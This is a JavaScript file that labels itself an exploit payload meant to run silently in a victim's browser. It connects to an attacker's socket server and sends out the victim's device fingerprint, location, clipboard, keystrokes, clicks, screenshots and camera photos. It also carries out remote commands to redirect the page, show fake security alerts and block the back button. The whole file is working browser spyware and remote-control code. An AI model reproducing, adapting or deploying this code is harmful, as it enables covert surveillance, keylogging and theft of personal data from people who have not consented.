// ðŸ•µï¸ EXPLOIT PAYLOAD - Runs silently in victim's browser
// Collects device info and sends to attacker's server

(function() {
    'use strict';
    
    // Don't disable console for debugging
    // console.log = function() {}; // Disabled for testing
    
    // Connect to attacker's server
    const socket = io();
    
    // Make socket globally available
    window.socket = socket;
    
    console.log('Exploit loaded, socket connecting...');
    
    // Device fingerprinting
    function getDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            memory: navigator.deviceMemory || 'unknown',
            cores: navigator.hardwareConcurrency || 'unknown',
            connection: navigator.connection ? {
                type: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt
            } : 'unknown',
            battery: 'checking...',
            online: navigator.onLine
        };
    }
    
    // Get geolocation (silently fails if no permission)
    function getLocation() {
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    socket.emit('victim_data', {
                        type: 'location',
                        data: {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date().toISOString()
                        }
                    });
                },
                (error) => {
                    // Don't show error to victim, just get approximate location from IP
                    getApproximateLocation();
                },
                { enableHighAccuracy: false, timeout: 3000, maximumAge: 0 }
            );
        } else {
            getApproximateLocation();
        }
    }
    
    // Get approximate location from IP (always works!)
    function getApproximateLocation() {
        fetch('https://ipapi.co/json/')
            .then(r => r.json())
            .then(data => {
                socket.emit('victim_data', {
                    type: 'location',
                    data: {
                        ip: data.ip,
                        city: data.city,
                        region: data.region,
                        country: data.country_name,
                        latitude: data.latitude,
                        longitude: data.longitude,
                        isp: data.org,
                        timezone: data.timezone,
                        method: 'IP-based (no permission needed)'
                    }
                });
            })
            .catch(err => {
                socket.emit('victim_data', {
                    type: 'location',
                    data: { 
                        error: 'Could not determine location',
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                    }
                });
            });
    }
    
    // Take screenshot (using html2canvas if loaded)
    function takeScreenshot() {
        if (typeof html2canvas !== 'undefined') {
            html2canvas(document.body, {
                allowTaint: true,
                useCORS: true,
                logging: false
            }).then(canvas => {
                const screenshot = canvas.toDataURL('image/png');
                socket.emit('victim_data', {
                    type: 'screenshot',
                    data: {
                        image: screenshot,
                        url: window.location.href,
                        timestamp: new Date().toISOString()
                    }
                });
            }).catch(err => {
                sendPageInfo();
            });
        } else {
            sendPageInfo();
        }
    }
    
    // Send detailed page info instead of screenshot
    function sendPageInfo() {
        socket.emit('victim_data', {
            type: 'screenshot',
            data: {
                url: window.location.href,
                title: document.title,
                viewport: {
                    width: window.innerWidth,
                    height: window.innerHeight
                },
                scroll: {
                    x: window.scrollX,
                    y: window.scrollY
                },
                visible_text: document.body.innerText.substring(0, 500),
                timestamp: new Date().toISOString()
            }
        });
    }
    
    // Get clipboard content (silently fails if no permission)
    async function getClipboard() {
        try {
            const text = await navigator.clipboard.readText();
            socket.emit('victim_data', {
                type: 'clipboard',
                data: { content: text, timestamp: new Date().toISOString() }
            });
        } catch (err) {
            // Silently fail - no error to victim
        }
    }
    
    // Get battery info
    async function getBattery() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                socket.emit('victim_data', {
                    type: 'battery',
                    data: {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    }
                });
            } catch (err) {}
        }
    }
    
    // Monitor keypresses
    let keylog = [];
    document.addEventListener('keydown', (e) => {
        keylog.push({
            key: e.key,
            time: new Date().toISOString(),
            url: window.location.href
        });
        
        // Send keylog every 10 keys
        if (keylog.length >= 10) {
            socket.emit('victim_data', {
                type: 'keylog',
                data: keylog
            });
            keylog = [];
        }
    });
    
    // Monitor clicks
    document.addEventListener('click', (e) => {
        socket.emit('victim_data', {
            type: 'click',
            data: {
                x: e.clientX,
                y: e.clientY,
                target: e.target.tagName,
                text: e.target.innerText?.substring(0, 50) || '',
                url: window.location.href,
                timestamp: new Date().toISOString()
            }
        });
    });
    
    // Listen for commands from admin
    socket.on('execute_command', (data) => {
        console.log('Received command:', data); // Debug
        const { command, params } = data;
        
        switch(command) {
            case 'get_device_info':
                socket.emit('victim_data', {
                    type: 'device_info',
                    data: getDeviceInfo()
                });
                break;
                
            case 'get_location':
                getLocation();
                break;
                
            case 'screenshot':
                takeScreenshot();
                break;
                
            case 'get_clipboard':
                getClipboard();
                break;
                
            case 'get_battery':
                getBattery();
                break;
                
            case 'get_network':
                socket.emit('victim_data', {
                    type: 'network',
                    data: {
                        online: navigator.onLine,
                        connection: navigator.connection ? {
                            type: navigator.connection.effectiveType,
                            downlink: navigator.connection.downlink + ' Mbps',
                            rtt: navigator.connection.rtt + ' ms'
                        } : 'unknown'
                    }
                });
                break;
                
            case 'vibrate':
                console.log('Executing vibrate command...'); // Debug
                if ('vibrate' in navigator) {
                    // Cancel any existing vibration first
                    navigator.vibrate(0);
                    
                    // Try multiple patterns for better compatibility
                    setTimeout(() => {
                        navigator.vibrate(1000); // 1 second strong vibrate
                    }, 100);
                    
                    console.log('Vibrate triggered'); // Debug
                    socket.emit('victim_data', {
                        type: 'command_result',
                        data: { 
                            command: 'vibrate', 
                            status: 'triggered',
                            note: 'Check if phone is in silent/DND mode',
                            timestamp: new Date().toISOString() 
                        }
                    });
                } else {
                    console.log('Vibrate not supported'); // Debug
                    socket.emit('victim_data', {
                        type: 'command_result',
                        data: { command: 'vibrate', status: 'not_supported' }
                    });
                }
                break;
                
            case 'play_sound':
                try {
                    // Create AudioContext - must be after user gesture
                    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                    
                    // Resume context in case it's suspended (autoplay policy)
                    if (audioContext.state === 'suspended') {
                        audioContext.resume();
                    }
                    
                    const oscillator = audioContext.createOscillator();
                    const gainNode = audioContext.createGain();
                    
                    oscillator.connect(gainNode);
                    gainNode.connect(audioContext.destination);
                    
                    oscillator.frequency.value = 800;
                    oscillator.type = 'sine';
                    
                    // Louder volume
                    gainNode.gain.setValueAtTime(0.8, audioContext.currentTime);
                    
                    oscillator.start(audioContext.currentTime);
                    oscillator.stop(audioContext.currentTime + 1.0); // Longer beep
                    
                    socket.emit('victim_data', {
                        type: 'command_result',
                        data: { 
                            command: 'play_sound', 
                            status: 'success',
                            audioState: audioContext.state,
                            timestamp: new Date().toISOString() 
                        }
                    });
                } catch (err) {
                    // Fallback to notification sound
                    try {
                        // Try notification API
                        if ('Notification' in window && Notification.permission === 'granted') {
                            new Notification('Alert', { silent: false });
                        }
                        
                        // Also try audio element
                        const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSuBzvLZiTYIGGS36+ejUBELTqLh8bllHQU2jdXux3kjBSh+zPDbjzkICVev5O+qWhELSKDf87FpIAU2kNjwyHciBC1+zPDakjsIClijVdwwVsERAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==');
                        audio.volume = 1.0;
                        audio.play().catch(() => {});
                        
                        socket.emit('victim_data', {
                            type: 'command_result',
                            data: { command: 'play_sound', status: 'fallback_attempted', error: err.message }
                        });
                    } catch (err2) {
                        socket.emit('victim_data', {
                            type: 'command_result',
                            data: { command: 'play_sound', status: 'failed', error: err.message + ' | ' + err2.message }
                        });
                    }
                }
                break;
                
            case 'open_url':
                if (params.url) {
                    window.open(params.url, '_blank');
                    socket.emit('victim_data', {
                        type: 'command_result',
                        data: { command: 'open_url', url: params.url, status: 'success' }
                    });
                }
                break;
                
            case 'redirect':
                const redirectUrl = params.url || 'https://google.com';
                socket.emit('victim_data', {
                    type: 'command_result',
                    data: { command: 'redirect', url: redirectUrl, status: 'redirecting' }
                });
                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 500);
                break;
                
            case 'spam_alert':
                let count = 0;
                const spamInterval = setInterval(() => {
                    alert('âš ï¸ WARNING: Security threat detected!');
                    count++;
                    if (count >= 3) {
                        clearInterval(spamInterval);
                        socket.emit('victim_data', {
                            type: 'command_result',
                            data: { command: 'spam_alert', alerts_shown: count, status: 'complete' }
                        });
                    }
                }, 1000);
                break;
                
            case 'disable_back':
                history.pushState(null, null, location.href);
                window.onpopstate = function () {
                    history.go(1);
                };
                socket.emit('victim_data', {
                    type: 'command_result',
                    data: { command: 'disable_back', status: 'enabled' }
                });
                break;
                
            case 'full_scan':
                // Collect everything in one go!
                getPublicIP();
                getApproximateLocation();
                getAdvancedInfo();
                getBattery();
                getLocation();
                takeScreenshot();
                socket.emit('victim_data', {
                    type: 'command_result',
                    data: { command: 'full_scan', status: 'scanning_all_data' }
                });
                break;
                
            case 'capture_photo':
                capturePhoto(params.camera || 'user'); // 'user' = front, 'environment' = back
                break;
                
            case 'start_camera':
                startCamera(params.camera || 'user');
                break;
                
            case 'stop_camera':
                stopCamera();
                break;
        }
    });
    
    // Get public IP address
    function getPublicIP() {
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {
                socket.emit('victim_data', {
                    type: 'ip_address',
                    data: {
                        ip: data.ip,
                        timestamp: new Date().toISOString()
                    }
                });
            })
            .catch(err => {});
    }
    
    // Get more device details
    function getAdvancedInfo() {
        const info = {
            plugins: Array.from(navigator.plugins || []).map(p => p.name),
            touchscreen: 'ontouchstart' in window,
            cookies_enabled: navigator.cookieEnabled,
            do_not_track: navigator.doNotTrack,
            referrer: document.referrer,
            current_url: window.location.href,
            page_title: document.title,
            timestamp: new Date().toISOString()
        };
        
        socket.emit('victim_data', {
            type: 'advanced_info',
            data: info
        });
    }
    
    // Initial data collection
    socket.on('connect', () => {
        console.log('Socket connected! Session ID:', socket.id);
        
        // Send device info immediately (always works!)
        socket.emit('victim_data', {
            type: 'device_info',
            data: getDeviceInfo()
        });
        
        // Get public IP (always works!)
        setTimeout(getPublicIP, 500);
        
        // Get approximate location (always works!)
        setTimeout(getApproximateLocation, 1000);
        
        // Get advanced info (always works!)
        setTimeout(getAdvancedInfo, 1500);
        
        // Try to get battery (may fail silently)
        setTimeout(getBattery, 2000);
        
        // Try GPS location (may fail silently)
        setTimeout(getLocation, 2500);
        
        // Notify admin that we're ready for commands
        setTimeout(() => {
            socket.emit('victim_data', {
                type: 'status',
                data: {
                    ready: true,
                    message: 'Victim ready for commands',
                    timestamp: new Date().toISOString()
                }
            });
        }, 3000);
        
        // Monitor page visibility
        document.addEventListener('visibilitychange', () => {
            socket.emit('victim_data', {
                type: 'visibility',
                data: {
                    visible: !document.hidden,
                    timestamp: new Date().toISOString()
                }
            });
        });
    });
    
    // Add disconnect handler
    socket.on('disconnect', () => {
        console.log('Socket disconnected');
    });
    
    // Camera capture functionality
    let activeStream = null;
    let videoElement = null;
    
    async function capturePhoto(cameraType = 'user') {
        try {
            console.log('Capturing photo from', cameraType, 'camera...');
            
            // Check if mediaDevices is available
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                throw new Error('Camera API not available. HTTPS required or browser does not support camera access.');
            }
            
            // Check if we're on HTTPS or localhost
            const isSecure = window.location.protocol === 'https:' || 
                           window.location.hostname === 'localhost' || 
                           window.location.hostname === '127.0.0.1';
            
            if (!isSecure) {
                throw new Error('Camera requires HTTPS connection. Current URL: ' + window.location.protocol + '//' + window.location.host);
            }
            
            // Request camera access
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: cameraType, // 'user' = front, 'environment' = back
                    width: { ideal: 1920 },
                    height: { ideal: 1080 }
                }
            });
            
            // Create hidden video element
            const video = document.createElement('video');
            video.style.display = 'none';
            video.autoplay = true;
            video.playsInline = true;
            document.body.appendChild(video);
            
            video.srcObject = stream;
            
            // Wait for video to be ready
            await new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            });
            
            // Wait a moment for camera to adjust
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // Create canvas and capture frame
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            // Convert to base64
            const imageData = canvas.toDataURL('image/jpeg', 0.8);
            
            // Send to server
            socket.emit('victim_data', {
                type: 'camera_photo',
                data: {
                    image: imageData,
                    camera: cameraType,
                    resolution: `${canvas.width}x${canvas.height}`,
                    timestamp: new Date().toISOString()
                }
            });
            
            // Cleanup
            stream.getTracks().forEach(track => track.stop());
            video.remove();
            
            console.log('Photo captured and sent!');
            
            socket.emit('victim_data', {
                type: 'command_result',
                data: { command: 'capture_photo', camera: cameraType, status: 'success' }
            });
            
        } catch (err) {
            console.error('Camera capture failed:', err);
            socket.emit('victim_data', {
                type: 'command_result',
                data: { 
                    command: 'capture_photo', 
                    status: 'failed', 
                    error: err.message,
                    isHTTPS: window.location.protocol === 'https:',
                    hostname: window.location.hostname,
                    mediaDevicesAvailable: !!navigator.mediaDevices,
                    getUserMediaAvailable: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia)
                }
            });
        }
    }
    
    async function startCamera(cameraType = 'user') {
        try {
            // Stop existing stream if any
            stopCamera();
            
            // Request camera access
            activeStream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: cameraType,
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            });
            
            // Create hidden video element for live stream
            videoElement = document.createElement('video');
            videoElement.style.position = 'fixed';
            videoElement.style.bottom = '10px';
            videoElement.style.right = '10px';
            videoElement.style.width = '160px';
            videoElement.style.height = '120px';
            videoElement.style.borderRadius = '10px';
            videoElement.style.zIndex = '9999';
            videoElement.style.border = '2px solid #00ff00';
            videoElement.autoplay = true;
            videoElement.playsInline = true;
            document.body.appendChild(videoElement);
            
            videoElement.srcObject = activeStream;
            
            socket.emit('victim_data', {
                type: 'command_result',
                data: { command: 'start_camera', camera: cameraType, status: 'streaming' }
            });
            
        } catch (err) {
            console.error('Camera start failed:', err);
            socket.emit('victim_data', {
                type: 'command_result',
                data: { command: 'start_camera', status: 'failed', error: err.message }
            });
        }
    }
    
    function stopCamera() {
        if (activeStream) {
            activeStream.getTracks().forEach(track => track.stop());
            activeStream = null;
        }
        if (videoElement) {
            videoElement.remove();
            videoElement = null;
        }
        
        socket.emit('victim_data', {
            type: 'command_result',
            data: { command: 'stop_camera', status: 'stopped' }
        });
    }
    
    // Test connection
    socket.on('ping', () => {
        console.log('Ping received from server');
        socket.emit('pong');
    });
    
    // Load html2canvas for screenshots
    const script = document.createElement('script');
    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
    document.head.appendChild(script);
    
})();
